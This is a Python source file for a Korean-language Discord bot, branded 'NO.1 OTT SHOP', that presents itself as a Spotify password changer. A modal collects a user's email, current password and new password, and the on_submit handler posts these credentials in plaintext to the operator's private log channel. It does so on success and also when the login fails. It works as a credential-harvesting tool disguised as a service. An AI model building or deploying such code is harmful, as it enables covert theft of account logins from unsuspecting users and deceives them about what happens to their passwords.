import discord
from discord.ext import commands
from spotify import Spotify

chid = 1234567890 # 로그 채널 ID를 넣어주세요.
token = "" # 봇 토큰을 넣어주세요.

class PersistentViewBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=commands.when_mentioned_or('!'), intents=discord.Intents.all())
    
    async def setup_hook(self) -> None:
        self.add_view(button())
        await client.tree.sync()

client = PersistentViewBot()

@client.event
async def on_ready():
    await client.tree.sync()

class button(discord.ui.View):
    @discord.ui.button(label="변경하기", style=discord.ButtonStyle.green)
    async def changebtn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(modal())

class modal(discord.ui.Modal, title="정보 입력하기"):
    uid = discord.ui.TextInput(label="이메일", style=discord.TextStyle.short)
    oldpw = discord.ui.TextInput(label="현재 비밀번호", style=discord.TextStyle.short)
    newpw = discord.ui.TextInput(label="변경될 비밀번호", style=discord.TextStyle.short)

    async def on_submit(self,interaction: discord.Interaction):
        embed = discord.Embed(title="비밀번호 변경 중..", description="``곧 결과가 표시됩니다.``")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        email = self.uid.value
        old = self.oldpw.value
        new = self.newpw.value
        spotify = Spotify()
        rs = await Spotify.changepw(spotify, email, old, new)
        
        if rs == "loginerror":
            embed = discord.Embed(title="비밀번호 변경 실패", description="사유 : ``로그인 실패!``", color=discord.Color.red())
            embed.set_footer(text="NO.1 OTT SHOP")
            embed.add_field(name="ID", value=email, inline=False)
            embed.add_field(name="PW", value=old, inline=False)
            await interaction.user.send(embed=embed)
            await interaction.edit_original_response(embed=embed)

            embed = discord.Embed(title="비밀번호 변경 실패", description="사유 : ``로그인 실패!``", color=discord.Color.red())
            embed.set_footer(text="NO.1 OTT SHOP")
            embed.add_field(name="유저", value=interaction.user.mention)
            embed.add_field(name="ID", value=email, inline=False)
            embed.add_field(name="PW", value=old, inline=False)
            channel = client.get_channel(chid)
            await channel.send(embed=embed)
        
        if rs == "success":
            embed = discord.Embed(title="비밀번호 변경 성공", color=discord.Color.green())
            embed.add_field(name="요청 유저", value=interaction.user.mention)
            embed.add_field(name="이메일", value=email)
            embed.add_field(name="변경된 비밀번호", value=new, inline=False)
            embed.add_field(name="변경전 비밀번호", value=old, inline=False)
            channel = client.get_channel(chid)
            await channel.send(embed=embed)
        
            embed = discord.Embed(title="비밀번호 변경 성공", color=discord.Color.green())
            embed.add_field(name="이메일", value=email)
            embed.add_field(name="변경된 비밀번호", value=new, inline=False)
            embed.add_field(name="변경전 비밀번호", value=old, inline=False)
            await interaction.user.send(embed=embed)
            await interaction.edit_original_response(embed=embed)
        
        if rs == "exception":
            embed = discord.Embed(title="비밀번호 변경 실패", description="알 수 없는 오류입니다.", color=discord.Color.red())
            embed.set_footer(text="NO.1 OTT SHOP")
            await interaction.user.send(embed=embed)
            await interaction.edit_original_response(embed=embed)
            
            embed = discord.Embed(title="비밀번호 변경 오류", color=discord.Color.red())
            embed.add_field(name="요청 유저", value=interaction.user.mention)
            embed.set_footer(text="NO.1 OTT SHOP")
            channel = client.get_channel(chid)
            await channel.send(embed=embed)

@client.tree.command(name="변경", description="변경")
async def menu(interaction: discord.Interaction):
    embed = discord.Embed(title="스포티파이 비밀번호 변경기", description="```버튼을 눌러서 계정 정보를 입력해주세요.```", color=discord.Color.orange())
    await interaction.response.send_message(embed=embed, view=button())

client.run(token)